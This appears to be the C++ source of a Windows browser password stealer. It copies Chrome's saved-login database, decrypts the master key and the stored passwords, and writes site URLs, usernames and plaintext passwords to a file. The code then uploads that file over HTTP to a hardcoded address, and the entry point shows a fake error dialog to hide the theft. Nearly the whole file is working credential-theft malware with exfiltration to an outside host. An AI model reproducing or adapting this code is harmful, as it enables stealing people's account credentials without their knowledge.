// WindowsProject1.cpp : Определяет точку входа для приложения.
//

#include "framework.h"
#include "WindowsProject1.h"
#include "common.h"




int upload_file(const char* file_path) {

    CURL* curl;
    CURLcode res;

    curl_httppost* post = NULL;
    curl_httppost* last = NULL;
    /*HttpPost* post = NULL;
    HttpPost* last = NULL;*/

    curl = curl_easy_init();
    if (curl)
    {
        curl_formadd(&post, &last,
            CURLFORM_COPYNAME, "file",
            CURLFORM_FILE, file_path,
            CURLFORM_END);



        curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.19.1:80/upload.php");
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);

        res = curl_easy_perform(curl);
        if (res)
        {
            return 0;
        }

        curl_formfree(post);
    }
    else
    {
        return 0;
    }
}


std::string get_AppData(int browser) {

	CHAR AppData_path[MAX_PATH];
	if (browser == FIREFOX) {
		if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, AppData_path) == S_OK)
		{
			std::string roaming_AppData_path(AppData_path);
			return roaming_AppData_path;
		}

	}
	else {
		if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, AppData_path) == S_OK)
		{
			std::string local_AppData_path(AppData_path);
			return local_AppData_path;
		}
	}

	return "";
}

std::string get_db_path(int browser) {
	return get_AppData(browser) + LOGIN_DATA_PATHS[browser];
}

std::string get_LocalState(int browser) {
	return get_AppData(browser) + LOCAL_STATE_PATHS[browser];
}


std::string copy_db(int browser) {
	std::string db_path = get_db_path(browser);

	if (!CopyFileA(db_path.c_str(), db_tmp, FALSE)) {
		std::cout << "Copy Failed - " << GetLastError();
	}

	return db_tmp;
}

std::string get_db_tmp(int browser) {
	return copy_db(browser);
}

std::string text_from_file(std::string file_path) {

	HANDLE hfile = CreateFileA(file_path.c_str(), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hfile == INVALID_HANDLE_VALUE) {

		//error to open file
		return "";

	}

	DWORD file_size = GetFileSize(hfile, NULL);

	if (file_size == INVALID_FILE_SIZE) {
		//error to get size

		CloseHandle(hfile);
		return "";
	}

	std::string file_data;
	file_data.resize(file_size);

	DWORD bytes_read;
	BOOL result = ReadFile(hfile, &file_data[0], file_size, &bytes_read, NULL);
	CloseHandle(hfile);

	if (!result || bytes_read != file_size) {
		//error to read
		return "";
	}

	return file_data;

}


std::string ParseEncryptKey(std::string data) {
	std::string encrypted_key;

	size_t cursiv = data.find("encrypted_key") + 16;

	while (cursiv < data.length() && data[cursiv] != '\"') {
		encrypted_key.push_back(data[cursiv]);
		cursiv++;
	}

	return encrypted_key;
}


DATA_BLOB* DecryptKey(std::string encrypt_key) {
	std::string base64Key = encrypt_key;
	std::vector<unsigned char> binaryKey;
	DWORD binary_KeySize = 0;

	if (!CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &binary_KeySize, NULL, NULL)) {
		//failed to convert base64 private key
		std::cout << "1 ERROR";
		return nullptr;
	}

	binaryKey.resize(binary_KeySize);

	if (!CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &binary_KeySize, NULL, NULL)) {
		//failed to convert base64 private key
		std::cout << "2 ERROR";
		return nullptr;
	}

	DATA_BLOB in, out;
	in.pbData = binaryKey.data() + 5;
	in.cbData = binary_KeySize - 5;

	if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
		return nullptr;
	}

	DATA_BLOB* outRet = new DATA_BLOB;
	outRet->pbData = out.pbData;
	outRet->cbData = out.cbData;

	return outRet;

}

DATA_BLOB* getKey(int browser) {
	std::string LocalState = get_LocalState(browser);
	std::string data_LocalState = text_from_file(LocalState);
	std::string encrypt_key = ParseEncryptKey(data_LocalState);

	return DecryptKey(encrypt_key);


}

std::string AESDecrypter(std::string EncryptedBlob, DATA_BLOB key) {
	BCRYPT_ALG_HANDLE hAlgorithm = 0;
	BCRYPT_KEY_HANDLE hKey = 0;
	NTSTATUS status = 0;
	SIZE_T EncryptedBlobSize = EncryptedBlob.length();
	SIZE_T TagOffset = EncryptedBlobSize - 15;
	ULONG PlainTextSize = 0;
	std::vector<BYTE> CipherPass(EncryptedBlobSize);
	std::vector<BYTE> PlainText;
	std::vector<BYTE> IV(IV_SIZE);

	std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
	std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());


	status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!BCRYPT_SUCCESS(status)) {
		std::cout << "BCryptOpen Failed, status - " << status;
		return "";
	}

	status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(status)) {
		std::cout << "BCrypSetProperl failed, status - " << status;
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return "";
	}

	status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, key.pbData, key.cbData, 0);
	if (!BCRYPT_SUCCESS(status)) {
		std::cout << "BCryptGenerateSymmKey failed, status - " << status;
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return "";
	}

	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
	TagOffset = TagOffset - 16;
	AuthInfo.pbNonce = IV.data();
	AuthInfo.cbNonce = IV_SIZE;
	AuthInfo.pbTag = CipherPass.data() + TagOffset;
	AuthInfo.cbTag = TAG_SIZE;

	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, NULL, NULL, &PlainTextSize, 0);
	if (!BCRYPT_SUCCESS(status)) {
		std::cout << "BCryptDecrypt (1) failed, status - " << status;
		return "";
	}
	PlainText.resize(PlainTextSize);

	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &PlainTextSize, 0);
	if (!BCRYPT_SUCCESS(status)) {
		std::cout << "BCryptDecrypt (2) failed, status - " << status;
		return "";
	}
	BCryptCloseAlgorithmProvider(hAlgorithm, 0);

	return std::string(PlainText.begin(), PlainText.end());

}

void StealLoginData(int browser) {

	std::string db_path = get_db_tmp(browser);
	DATA_BLOB* Key = getKey(browser);

	sqlite3* db = NULL;
	std::string querry = "SELECT origin_url, action_url, username_value, password_value FROM logins";
	sqlite3_stmt* stmt = nullptr;

	if (sqlite3_open(db_path.c_str(), &db) != SQLITE_OK) {
		std::cerr << "Failed open db: " << sqlite3_errmsg(db) << std::endl;
		return;
	}

	if (sqlite3_prepare_v2(db, querry.c_str(), -1, &stmt, 0) != SQLITE_OK) {
		std::cerr << "Failed sqlite3_prepare: " << sqlite3_errmsg(db) << std::endl;
		return;
	}

	HANDLE hFile = CreateFile(file_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD bytesWritten;






	while (sqlite3_step(stmt) == SQLITE_ROW) {

		std::string full_website = "Website: ";
		std::string full_loginUrl = "Login URL: ";
		std::string full_username = "Username: ";
		std::string full_password = "Password: ";
		std::string poloska = "======================================\n";


		SetFilePointer(hFile, 0, NULL, FILE_END);
		const char* website = (char*)sqlite3_column_text(stmt, 0);

		const char* loginUrl = (char*)sqlite3_column_text(stmt, 1);

		const char* username = (char*)sqlite3_column_text(stmt, 2);

		const char* passwordBlob = (char*)sqlite3_column_blob(stmt, 3);


		int passwordBlobSize = sqlite3_column_bytes(stmt, 3);

		if (passwordBlobSize > 0) {
			std::string pass = AESDecrypter(passwordBlob, *Key);
			full_website = full_website + website + '\n';
			full_loginUrl = full_loginUrl + loginUrl + '\n';
			full_username = full_username + username + '\n';
			full_password = full_password + pass + '\n';

			WriteFile(hFile, full_website.c_str(), strlen(full_website.c_str()), &bytesWritten, NULL);
			SetFilePointer(hFile, 0, NULL, FILE_END);
			WriteFile(hFile, full_loginUrl.c_str(), strlen(full_loginUrl.c_str()), &bytesWritten, NULL);
			SetFilePointer(hFile, 0, NULL, FILE_END);
			WriteFile(hFile, full_username.c_str(), strlen(full_username.c_str()), &bytesWritten, NULL);
			SetFilePointer(hFile, 0, NULL, FILE_END);
			WriteFile(hFile, full_password.c_str(), strlen(full_password.c_str()), &bytesWritten, NULL);

			WriteFile(hFile, poloska.c_str(), strlen(poloska.c_str()), &bytesWritten, NULL);
		}
		else {
			std::cout << "No password found";
		}
	}


	delete Key;
	CloseHandle(hFile);
	upload_file(file_path_char);
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
   

	StealLoginData(CHROME);
    MessageBox(NULL, L"Ошибка 0x803F7001. Программа не может быть запущена.", L"Error", MB_OK | MB_ICONHAND);
    return 0;
}



//
//  ФУНКЦИЯ: MyRegisterClass()
//
//  ЦЕЛЬ: Регистрирует класс окна.
//
/*ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WINDOWSPROJECT1));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_WINDOWSPROJECT1);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}
*/

//
//   ФУНКЦИЯ: InitInstance(HINSTANCE, int)
//
//   ЦЕЛЬ: Сохраняет маркер экземпляра и создает главное окно
//
//   КОММЕНТАРИИ:
//
//        В этой функции маркер экземпляра сохраняется в глобальной переменной, а также
//        создается и выводится главное окно программы.
//
/*
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // Сохранить маркер экземпляра в глобальной переменной

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}
*/
//
//  ФУНКЦИЯ: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  ЦЕЛЬ: Обрабатывает сообщения в главном окне.
//
//  WM_COMMAND  - обработать меню приложения
//  WM_PAINT    - Отрисовка главного окна
//  WM_DESTROY  - отправить сообщение о выходе и вернуться
//
//
/*
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // Разобрать выбор в меню:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: Добавьте сюда любой код прорисовки, использующий HDC...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}
*/
// Обработчик сообщений для окна "О программе".
/*
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
*/